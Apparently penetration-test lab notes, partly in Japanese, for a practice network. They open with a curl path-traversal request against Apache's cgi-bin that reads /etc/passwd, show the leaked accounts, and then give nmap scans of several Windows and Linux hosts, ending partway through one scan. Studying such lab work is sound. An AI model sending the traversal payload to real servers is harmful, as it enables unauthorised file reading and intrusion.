port scanの結果から245 WEB01のapacheに脆弱性があることを確認
```
curl http://192.168.102.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
```

出力結果から
```
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
```

# Port Scan
## 249 LEGACY
### open ports
```
Open 192.168.102.249:80
Open 192.168.102.249:135
Open 192.168.102.249:139
Open 192.168.102.249:445
Open 192.168.102.249:3389
Open 192.168.102.249:5985
Open 192.168.102.249:8000
Open 192.168.102.249:47001
Open 192.168.102.249:49664
Open 192.168.102.249:49665
Open 192.168.102.249:49666
Open 192.168.102.249:49667
Open 192.168.102.249:49669
Open 192.168.102.249:49670
Open 192.168.102.249:49668
```
### details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:07:55+00:00
| ssl-cert: Subject: commonName=LEGACY
| Issuer: commonName=LEGACY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:08
| Not valid after:  2026-02-16T15:04:08
| MD5:   3da2:36ec:fcb2:8692:f2e6:72d5:627f:14e0
| SHA-1: 408b:8830:8245:9c6b:4440:ad98:3f8c:632a:5718:7974
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQZJuEbVYS5IdIe8Vy/a9PzDANBgkqhkiG9w0BAQsFADAR
| MQ8wDQYDVQQDEwZMRUdBQ1kwHhcNMjUwODE3MTUwNDA4WhcNMjYwMjE2MTUwNDA4
| WjARMQ8wDQYDVQQDEwZMRUdBQ1kwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCqz6M0RqUSz8qLutZWZmJU8xYW5nfrT5IDJuc/Uwe9MVi3RDkkL/8VbExi
| ZlrWjiyyYYSNmxy6h/RnlbpClT9k2lrDXMA8O2cvIHupyzZ8xz9ReNobhRlazHqx
| EYGQ5OBVXCTiClRLz8KwG8Xe8Vx1Ixjg2FMwgblbQKVI6sbOxdVd6T5wzs5TcdTp
| 1deQCcZ1xSIAn1jovRlZcEU1xUValTGGFB7AVtVDMBp69nhtJOxhr/uH421SetU3
| f5LLNda3Np8TSmFMP6KKtTjKezC9qUZTPWnoTwa3nS6KMMRIKjVDj7ff6G+SEWGA
| 7YxyqTGxa6vUkXK2GR6RPb7l/y9hAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEABNrppxfmm0xOJgiy
| F7Z9p/07M0Xj89iUlPE5ccIOyDk5k6Ikqd2L7BKvvYIKMcbfULoM1Tj/QuvEf6bc
| /nFBuKvisKs2VyVa0YIAFvhelO51gIXk8NXMbLV6VyOf5wcQLJKcm9bGu6SwLuHs
| oLypq+cqo36POh8ka1PYl3hqu+0g8V2mtGCS/L10HMueh7BJJRZmozEjSffR09Vt
| +JOvzAW5LF5+59WQBQSLVk/BcLMfFM5pHBv0hbwROMEY/uHfZ+WNToD9uWkfMgJV
| myg6LLnR9UY2Wj4k73uInci+UkJwwWwFJnGf8bmexYERiBEtjBxV4lfblDhwwDNk
| 2T63ZA==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-18T15:08:03+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.102.249:8000/dashboard/
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 10 1703 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=32117%PV=Y%DS=4%DC=T%G=N%TM=68A341D3%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%TS=A)
SEQ(SP=108%GCD=1%ISR=10A%TI=RD%CI=I)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.000 days (since Mon Aug 18 11:07:51 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18025/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33881/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35884/udp): CLEAN (Failed to receive data)
|   Check 4 (port 28997/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-08-18T15:07:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

## 248 EXTERNAL
### open ports
```
Open 192.168.102.248:80
Open 192.168.102.248:135
Open 192.168.102.248:139
Open 192.168.102.248:445
Open 192.168.102.248:3389
Open 192.168.102.248:5985
Open 192.168.102.248:47001
Open 192.168.102.248:49664
Open 192.168.102.248:49665
Open 192.168.102.248:49670
Open 192.168.102.248:49668
Open 192.168.102.248:49669
Open 192.168.102.248:49666
Open 192.168.102.248:49667
Open 192.168.102.248:49965
```
### details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 2DE6897008EB657D2EC770FE5B909439
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries 
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
| /Documentation/ /HttpModules/ /Install/ /Providers/ 
|_/Activity-Feed/userId/
|_http-title: Home
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=EXTERNAL
| Issuer: commonName=EXTERNAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:07
| Not valid after:  2026-02-16T15:04:07
| MD5:   6964:ce43:5fcf:ccd6:1c7f:7819:6007:1c48
| SHA-1: d482:3b4e:682b:b5ce:6eb4:3531:fad5:8ec6:f38c:9c4a
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQcIFyiLewjoxIKLFtYsRAVTANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhFWFRFUk5BTDAeFw0yNTA4MTcxNTA0MDdaFw0yNjAyMTYxNTA0
| MDdaMBMxETAPBgNVBAMTCEVYVEVSTkFMMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAmtd6C6YvysouXiiw1nSMDUIMuFshpNpu1//KvawDEi6PloB+kS+n
| sjW8oa0URh8KYIbtLJ1CBBOW/X72SQONqCFMTY6XvmIkaExtmcpQkEvhOvDOlSLE
| 8A18CrEMfqnqIq5M+paNZm1YV2ESgYZVTGje/Y6dCmn6SVJEcB7pcIH4mRtBIB1w
| n1Ii/yjfM07apwycccxUFSJdievDu+aQmg9kZ/H5gKJvzUkDZTWlttqQFMHf9K3J
| bdw2j0Hmy+5i4B0tzIoJhgAxp4OMprV+giIUjdG77EdOxcFAZ7QFwKUn1fuyUcAn
| VdEr1aPgWVFCj4Z4KQjkQDEvd1HtzMBWlQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHnd+T6XRnh1
| eoprOQ24mDjdodQXjFJlSC/mq4NtbnR81IszfJ3rDg4LKSls6Ldvk2Cnp8J1CtTC
| 0uFhFxwpkRXpsrITuaLgMjw6TREE7R/n8VbM1C4X9DsftjAS52cl8tnhG/hiPezt
| ZfdDin9hF8utRFbv6ZN9sq1UCvZn+xXxihg1xR+3MpJQ6iY9hpLFC5t02WO6KS+E
| AIhr2TFQz+4O5ETnefDuTnTVtnAyPRjX+ICgqlp7OCB4A4pLsdAdHO3FjCESUP4S
| +B34XEsFJ6COamqTetYV3AxQi98lzt2jPOZvmpNqK9yQMP50qO5RPE+6GS0575Uh
| cguItsVzo/8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:08:17+00:00
|_ssl-date: 2025-08-18T15:08:25+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49965/tcp open  ms-sql-s      syn-ack ttl 125 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.102.248:49965: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49965
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T13:19:45
| Not valid after:  2054-09-17T13:19:45
| MD5:   6a54:139e:be8d:8272:c6b2:4531:c5d2:6827
| SHA-1: a3f8:6818:cee2:4292:994c:3931:ce8d:8af1:2cd3:b456
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQepLa93u5dZtFW2YSsUN5gjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjQwOTE3MTMxOTQ1WhgPMjA1NDA5MTcxMzE5NDVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK7KwA4a
| yTmnNsNCtGGP6fj6Vv0Gu6pToiCNGmEhM9Pxg1HUOsuO1r2lHBOoW1E5LV0gWOSR
| hhKsyN0wwE5v23O+bqJhCXsuJdX7WksloMGxR4AUzy8HXiQoPi6UGXoUQZPg39Yb
| AfnSkV23kVow0F7js1hpODzQEqzPo8a19eNNjoRatJA3BCLertYU+8nS3MIxm8fI
| 3O1ffNI1Ml+tUnXmsEV3Dep1JdU19+IWmfxuU1WJcYrdqEY5u17L1/2mHLEWSLDy
| 9bBX5r6kkIzTrYgL+bd4TflWDUMx4b2+e50eaRa/fU620yZB9+nWRBt3Yo77cwgN
| 3ImnZmAmrO3nMb0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAVAJv4yhUgppSwrIa
| 8U4v5e2r1yK8U6rA6C2cEyRvM9LZHulJWNoWeDDrSK64wYSX9n9HIMOshhup3R2I
| 9akTVsLbYk4IIdL1Liptexncs9ts6p2FZ7J1jUcEEPqlwiUWkcqG/Snfd5MddvYF
| hG8lNDCMh/7R8d3ImB+JhTwS1pLjpuNkHaywckNAZ4gYjVGdA2u+16mhf6eLd1+B
| ITCUt5ZrR+u2TCfZ6rAf4Q5K5LjzX7udSPYAfnBRwOzj+QnHjsSM6pnLUYnZehog
| /ptrfRct6/UIicYbp7fEhlB3ffgipD648bUFE3CdsRx7iUE68Wax+/q7cs20OBZU
| VhrQ/w==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   192.168.102.248:49965: 
|     Target_Name: EXTERNAL
|     NetBIOS_Domain_Name: EXTERNAL
|     NetBIOS_Computer_Name: EXTERNAL
|     DNS_Domain_Name: EXTERNAL
|     DNS_Computer_Name: EXTERNAL
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-08-18T15:08:25+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=33413%PV=Y%DS=4%DC=T%G=N%TM=68A341E9%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10D%TI=I%CI=I%TS=A)
SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.005 days (since Mon Aug 18 11:01:44 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39235/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15956/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36086/udp): CLEAN (Failed to receive data)
|   Check 4 (port 43580/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-08-18T15:08:21
|_  start_date: N/A

```
## 247 WEB02
### open ports
```
Open 192.168.102.247:80
Open 192.168.102.247:135
Open 192.168.102.247:139
Open 192.168.102.247:445
Open 192.168.102.247:443
Open 192.168.102.247:3389
Open 192.168.102.247:5985
Open 192.168.102.247:14020
Open 192.168.102.247:14080
Open 192.168.102.247:47001
Open 192.168.102.247:49668
Open 192.168.102.247:49665
Open 192.168.102.247:49664
Open 192.168.102.247:49666
Open 192.168.102.247:49669
Open 192.168.102.247:49667
Open 192.168.102.247:49670
```
### details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: RELIA - New Hire Information
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_http-title: RELIA - New Hire Information
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Issuer: commonName=WEB02
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:08
| Not valid after:  2026-02-16T15:04:08
| MD5:   f1a4:69c0:4953:c62f:dbbd:5998:1e7b:c014
| SHA-1: d335:8eb5:c280:4ee0:0f1d:6924:7b73:d4d2:74f9:388a
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQQJgEqB64oLRFcuaMxg4BtDANBgkqhkiG9w0BAQsFADAQ
| MQ4wDAYDVQQDEwVXRUIwMjAeFw0yNTA4MTcxNTA0MDhaFw0yNjAyMTYxNTA0MDha
| MBAxDjAMBgNVBAMTBVdFQjAyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEA1NS8WlmVK26wsrgC5F827dViX98fyabfdMWGHW5G5DwNv0+e9h96Tk0cb3oy
| Pn3gitU5EURuF7ls4WN6YJY/GZq1OqVM8UMm7tgq0chQUkzMCljrOrLizYLB1gF7
| W0Fel0s8mvoaer/xHXHZujO15R0xysopWY7CXoYRmnhTZG4Rc2Qr7Y7/UsRnTOeL
| cRldocX/4/WPcFXsc9CPa5psnZ42OLoQvoH/e2RvbIvLmPtxi1283eqj7mZn/otv
| oZz7Cvhlve0vlOeUZKEEzUMlc8CnMbgdJCJoln0UszuZrwg4wxWW8gbcQvZ8bCER
| TegAAGuL/+AP+c7N/Ox+fSdLFQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBADcxfd8qHruYyg3kYtFW
| FYjYKI3qvGyZeT5K1aYI9RlNun4yvBvZpKoqTfAC3XxyTKF974xB35+MWCc5ItMd
| 4oeIpJSa6nOLy7bFsMd91qeHVvdviWFIxZdgfYKy/PVqLXe8EdV3eiAoSStpdYzk
| PKcNPhEO7fmNNRZio/Y1+XZbXpLxhB5M1ZoEvvhqi4PW70PoHgWMBN2ldEMu9Y5/
| LzMZ4pa8y/SQXoQaylUavOh3Bhvl7CpSfd8kOcRbKMavQ0i5ZY/bZGOZ/r+K1r0e
| 9lzB1rbeiTgU+9L2Of/P780LS8lNOu3q6zUolqGzx1YtTM1fC3UA4Ii2gffDj+wQ
| Cjc=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:11:29+00:00
|_ssl-date: 2025-08-18T15:11:36+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14020/tcp open  ftp           syn-ack ttl 125 FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
14080/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows Server 2012 Data Center (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=38315%PV=Y%DS=4%DC=T%G=N%TM=68A342AA%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%TS=A)
SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.005 days (since Mon Aug 18 11:04:46 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-18T15:11:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45663/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44879/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41639/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44785/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

```
## 246 DEMO
### open ports
```
Open 192.168.102.246:80
Open 192.168.102.246:443
Open 192.168.102.246:2222
```
### details
```
PORT     STATE SERVICE  REASON         VERSION
80/tcp   open  http     syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
